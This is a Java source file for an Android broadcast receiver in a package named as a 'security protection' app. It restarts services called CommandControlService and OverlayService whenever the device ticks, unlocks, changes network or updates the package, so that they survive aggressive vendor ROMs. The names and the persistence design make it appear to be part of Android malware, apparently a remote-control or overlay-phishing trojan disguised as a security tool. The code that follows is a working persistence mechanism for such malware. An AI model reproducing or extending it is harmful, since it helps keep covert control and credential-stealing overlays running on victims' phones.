package com.seguranca.protecao;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

/**
 * AliveReceiver - Mantem o app vivo em ROMs agressivas (MIUI, ColorOS, EMUI)
 * Recebe eventos do sistema e garante que os servicos estejam rodando
 */
public class AliveReceiver extends BroadcastReceiver {

    private static final String TAG = "AliveReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent == null || intent.getAction() == null) return;
        String action = intent.getAction();
        Log.d(TAG, "Received: " + action);

        try {
            boolean relevante =
                    "android.intent.action.TIME_TICK".equals(action) ||
                    "android.net.conn.CONNECTIVITY_CHANGE".equals(action) ||
                    Intent.ACTION_USER_PRESENT.equals(action) ||
                    "android.intent.action.USER_UNLOCKED".equals(action) ||
                    "android.intent.action.MY_PACKAGE_REPLACED".equals(action);
            if (relevante) {
                revive(context);
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro: " + e.getMessage());
        }
    }

    public static void revive(Context context) {
        ensureServiceRunning(context, CommandControlService.class);
        ensureServiceRunning(context, OverlayService.class);
    }

    private static void ensureServiceRunning(Context context, Class<?> serviceClass) {
        try {
            Intent serviceIntent = new Intent(context, serviceClass);
            serviceIntent.setPackage(context.getPackageName());
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                try {
                    context.startForegroundService(serviceIntent);
                } catch (Exception e) {
                    try { context.startService(serviceIntent); } catch (Exception ignored) {}
                }
            } else {
                context.startService(serviceIntent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro ao iniciar servico: " + e.getMessage());
        }
    }
}